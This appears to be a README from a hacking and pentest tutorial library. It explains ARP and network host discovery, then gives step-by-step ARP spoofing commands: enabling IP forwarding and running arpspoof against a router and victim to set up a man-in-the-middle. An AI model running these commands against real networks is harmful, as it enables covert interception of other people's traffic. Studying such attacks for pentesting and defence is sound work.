# Introduction to Hacking Library

The goal of this library is to create an archive of useful tools and how to use them, mostly for:

- Hacking
- Pentests 
- Security

Remember, this is only a guide, use the knowledge here wisely and at your own risk.

Have fun!

# Analysis Tools 

## ARP

The ARP protocol (Address Resolution Protocol) associates every MAC address with an IP address in the local network. The way this works is with a broadcast in the local network, asking every host about their pairs IP/MAC. Every time a broadcast occurs the host sends his own pair IP/MAC besides asking other hosts their pairs, so it can be saved into a cache in every machine.

You can check the cache in your own machine with:

```console
 arp -a
```

Using ARP protocol you can either scan your local network to discover hosts, revealing their MAC addresses and internet adapter manufacturer:

```console
 sudo arp-scan --interface=eth0 --localnet
```

or try to guess the OS of the hosts with:

```console
 sudo arp-fingerprint -l
```

# Attack Tools

## ARP Spoofing

The objective of this attack is to add/replace some entries in the ARP table making the router believe that the attacker is in reality the victim and making the victim believe that the attacker is the router.

![ARP Spoofing Image](/img/ARP%20Spoofing.png)

### Enabling fowarding:

First you need to enable fowarding of packets so the victim doesn't know that something happened.

- For temporary fowarding (this will disable fowarding when the machine is rebooted):
```console
 sudo sysctl -w net.ipv4.ip_forward=1
```
or 
```console
 sudo echo 1 > /proc/sys/net/ipv4/ip_forward
```

- For permanent fowarding:
```console
 sudo nano /etc/sysctl.conf
```
then find the line:
```
#Uncomment the next line to enable packet forwarding for IPv4
#net.ipv4.ip_forward=1
```
and delete the "#" in the second line:
```
#Uncomment the next line to enable packet forwarding for IPv4
net.ipv4.ip_forward=1
```
then

> Ctrl o

> Enter

> Ctrl x

and finally run this to apply the changes:

```console
 sudo sysctl -p /etc/sysctl.conf
```

### Making a man in the middle with Arpspoof:

To make this we will use this command two times:

```console
 sudo arpspoof -i {NETWORK_INTERFACE} -t {TARGET_IP} {IP_YOU_WILL_BE_PRETENDING_TO_BE}
```

- First to make the router think that our machine is the victim:

```console
 sudo arpspoof -i {NETWORK_INTERFACE} -t {ROUTER_IP} {VICTIM_IP}
```

Example:

```console
 sudo arpspoof -i eth0 -t 192.168.0.1 192.168.0.104
```

- Then we make the victim think that our machine is the router:

```console
 sudo arpspoof -i {NETWORK_INTERFACE} -t {VICTIM_IP} {ROUTER_IP}
```

Example:

```console
 sudo arpspoof -i eth0 -t 192.168.0.104 192.168.0.1
```

and with this we have a man in the middle set.